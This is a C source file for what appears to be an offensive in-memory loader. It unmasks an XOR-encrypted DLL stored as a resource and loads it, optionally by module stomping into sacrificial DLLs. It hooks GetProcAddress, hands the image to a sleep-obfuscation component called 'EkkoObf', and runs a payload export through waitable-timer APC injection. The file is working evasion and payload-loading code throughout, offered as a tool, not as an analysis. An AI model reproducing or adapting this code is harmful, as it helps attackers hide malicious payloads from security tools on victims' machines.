#include "loader.h"
#include "stomp.h"

#define SAFE_FREE(ptr, size) \
    if (ptr) { \
        volatile char *vptr = (volatile char *)ptr; \
        for (size_t _i = 0; _i < size; _i++) vptr[_i] = 0; \
        KERNEL32$VirtualFree(ptr, 0, MEM_RELEASE); \
        ptr = NULL; \
    }

#define UNMASK_BUFFER(src, src_len, dst, key, key_len)            \
    do {                                                          \
        for (size_t _i = 0; _i < (size_t)(src_len); _i++) {       \
            ((unsigned char*)(dst))[_i] =                         \
                ((unsigned char*)(src))[_i] ^                     \
                ((unsigned char*)(key))[_i % (key_len)];          \
        }                                                         \
    } while (0)

static const DWORD ProtectionMap[8] = {
    PAGE_NOACCESS,          // 000: None
    PAGE_EXECUTE,           // 001: E
    PAGE_READONLY,          // 010: R
    PAGE_EXECUTE_READ,      // 011: R E
    PAGE_READWRITE,         // 100: W (mapped to RW)
    PAGE_EXECUTE_READWRITE, // 101: W E (mapped to RWX)
    PAGE_READWRITE,         // 110: R W
    PAGE_EXECUTE_READWRITE  // 111: R W E
};

DWORD GetWin32Protection(DWORD Characteristics) {
    int index = 0;
    if (Characteristics & IMAGE_SCN_MEM_EXECUTE) index |= 1;
    if (Characteristics & IMAGE_SCN_MEM_READ)    index |= 2;
    if (Characteristics & IMAGE_SCN_MEM_WRITE)   index |= 4;
    
    return ProtectionMap[index];
}

void fix_section_permissions(DLLDATA *dll, char *base_addr) {
    IMAGE_SECTION_HEADER *section = (IMAGE_SECTION_HEADER *)PTR_OFFSET(
        dll->OptionalHeader, 
        dll->NtHeaders->FileHeader.SizeOfOptionalHeader
    );

    for (WORD i = 0; i < dll->NtHeaders->FileHeader.NumberOfSections; i++, section++) {
        void *target_ptr = (void *)(base_addr + section->VirtualAddress);
        DWORD size = (section->Misc.VirtualSize > 0) ? section->Misc.VirtualSize : section->SizeOfRawData;

        if (size == 0) continue;

        DWORD new_prot = GetWin32Protection(section->Characteristics);
        DWORD old_prot = 0;

        if (!KERNEL32$VirtualProtect(target_ptr, size, new_prot, &old_prot)) {
            StealthDbg("Failed: Section %-8.8s (Error: %lu)\n", section->Name, KERNEL32$GetLastError());
            continue;
        }

        StealthDbg("Section %-8.8s | Prot: 0x%02lX | Addr: %p\n", section->Name, new_prot, target_ptr);
    }
}

VOID APIENTRY TimerAPCProc(LPVOID lpArgToCompletionRoutine, DWORD dwTimerLowValue, DWORD dwTimerHighValue) {
    APC_CALLBACK_CTX *ctx = (APC_CALLBACK_CTX *)lpArgToCompletionRoutine;
    
    if (ctx && ctx->fn) {
        ctx->fn();
    }
    
    if (ctx && ctx->event) {
        KERNEL32$SetEvent(ctx->event);
    }
}

void ExecuteViaWaitableTimer(_GetVersions pGetVersions) {
    HANDLE hTimer = KERNEL32$CreateWaitableTimerA(NULL, TRUE, NULL);
    HANDLE hEvent = KERNEL32$CreateEventA(NULL, TRUE, FALSE, NULL);
    
    if (!hTimer || !hEvent) return;

    APC_CALLBACK_CTX ctx = { .fn = pGetVersions, .event = hEvent };
    
    LARGE_INTEGER liDueTime;
    liDueTime.QuadPart = -1; 

    StealthDbg("Setting Waitable Timer for APC injection...\n");

    if (KERNEL32$SetWaitableTimer(hTimer, &liDueTime, 0, TimerAPCProc, &ctx, FALSE)) {        
        KERNEL32$WaitForSingleObject(hEvent, 500);
        StealthDbg("APC execution completed successfully.\n");
    }

    KERNEL32$CloseHandle(hTimer);
    KERNEL32$CloseHandle(hEvent);
}

void go(void)
{
    IMPORTFUNCS funcs;
    funcs.LoadLibraryA   = LoadLibraryA;
    funcs.GetProcAddress = GetProcAddress;
    
    /* get the pico */
    char * pico_src = GETRESOURCE ( _PICO_ );
    PICO* pico_dst = NULL;
#if MODE_STOMP
    PICO_ARGS picoArgs;
    picoArgs.funcs = &funcs;
    picoArgs.pico_src = pico_src;
    picoArgs.pico_dst = &pico_dst;
    picoArgs.sacrificialDll = PICO_STOMP_DLL;

    STOMP_ARGS stompArgs;
    stompArgs.resourceType = rPICO;
    stompArgs.picoArgs = picoArgs;

    StealthDbg("calling Stomp to load PICO code into sacrificial DLL...\n");

    if ( !Stomp(stompArgs) ) {
        StealthDbg("ERROR: Stomp failed\n");
        return;
    }
#else
    	/* allocate memory for it */
    pico_dst = ( PICO * ) KERNEL32$VirtualAlloc ( NULL, sizeof ( PICO ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );

    /* load it into memory */
    PicoLoad ( &funcs, pico_src, pico_dst->code, pico_dst->data );

    /* make code section RX */
    DWORD old_protect;
    KERNEL32$VirtualProtect ( pico_dst->code, PicoCodeSize ( pico_src ), PAGE_EXECUTE_READ, &old_protect );

#endif
    // /* call setup_hooks to overwrite funcs.GetProcAddress */
    ( ( SETUP_HOOKS ) PicoGetExport ( pico_src, pico_dst->code, __tag_setup_hooks ( ) ) ) ( &funcs );

    StealthDbg("setup_hooks called, proceeding to load and fixup DLL...\n");

    RESOURCE * masked_dll = ( RESOURCE * ) GETRESOURCE ( _DLL_ );
    RESOURCE * mask_key   = ( RESOURCE * ) GETRESOURCE ( _MASK_ );
                                                     
    /* allocate some temporary memory */
    char * dll_src = KERNEL32$VirtualAlloc ( NULL, masked_dll->len, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );

    /* unmask and copy it into memory */
    UNMASK_BUFFER(masked_dll->value, masked_dll->len, dll_src, mask_key->value, mask_key->len);

    DLLDATA dll_data;
    ParseDLL(dll_src, &dll_data);
#if MODE_STOMP
    MSVCRT$memset( &stompArgs, 0, sizeof(stompArgs) );

    char* dll_dst = NULL;
    DLL_ARGS dllArgs;
    dllArgs.dll_data = &dll_data;
    dllArgs.funcs = &funcs;
    dllArgs.dll_src = &dll_src;
    dllArgs.dll_dst = &dll_dst;
    dllArgs.sacrificialDll = DLL_STOMP_DLL;

    stompArgs.resourceType = rDLL;
    stompArgs.dllArgs = dllArgs;

    if ( !Stomp( stompArgs ) ) {
        StealthDbg("ERROR: StompDLL failed\n");
        KERNEL32$VirtualFree(dll_src, 0, MEM_RELEASE);
        return;
    }
#else
    char * dll_dst = KERNEL32$VirtualAlloc ( NULL, SizeOfDLL ( &dll_data ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );
    if (!dll_dst) {
        StealthDbg("ERROR: Failed to allocate memory for DLL (Error: %lu)\n", KERNEL32$GetLastError());
        SAFE_FREE(dll_src, masked_dll->len);
        return;
    }
    LoadDLL ( &dll_data, dll_src, dll_dst );

    ProcessImports ( &funcs, &dll_data, dll_dst );
#endif
    /* wipe and free the unmasked DLL copy — only dll_dst is needed from here */
    SAFE_FREE(dll_src, masked_dll->len);
    /* re-parse from the mapped image since dll_src is gone */
    ParseDLL ( dll_dst, &dll_data );

    /* tell the PICO (EkkoObf) which region is the DLL image */
    ( ( SET_IMAGE_INFO ) PicoGetExport ( pico_src, pico_dst->code, __tag_set_image_info ( ) ) ) ( dll_dst, SizeOfDLL(&dll_data) );

    StealthDbg ( "fixing section permissions...\n" );
    fix_section_permissions(&dll_data, dll_dst);

    /* protect the PE header page as read-only */
    DWORD hdr_old_protect = 0;
    KERNEL32$VirtualProtect ( dll_dst, dll_data.NtHeaders->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &hdr_old_protect );
	KERNEL32$FlushInstructionCache((HANDLE)-1, dll_dst, SizeOfDLL(&dll_data));

    StealthDbg ( "calling entry point...\n" );
    DLLMAIN_FUNC entry_point = EntryPoint(&dll_data, dll_dst);
    entry_point((HINSTANCE)dll_dst, DLL_PROCESS_ATTACH, NULL);

    KERNEL32$FlushInstructionCache((HANDLE)-1, dll_dst, SizeOfDLL(&dll_data));

	char targetFunc[] = { 'G','e','t','V','e','r','s','i','o','n','s', 0 };
    _GetVersions pGetVersions = (_GetVersions)GetExport(dll_dst, targetFunc);
    if (pGetVersions)
    {
        StealthDbg("Executing target function via Waitable Timer APC...\n");
        ExecuteViaWaitableTimer(pGetVersions);
    } else {
        StealthDbg("ERROR: Failed to find target function in loaded DLL.\n");
    }
}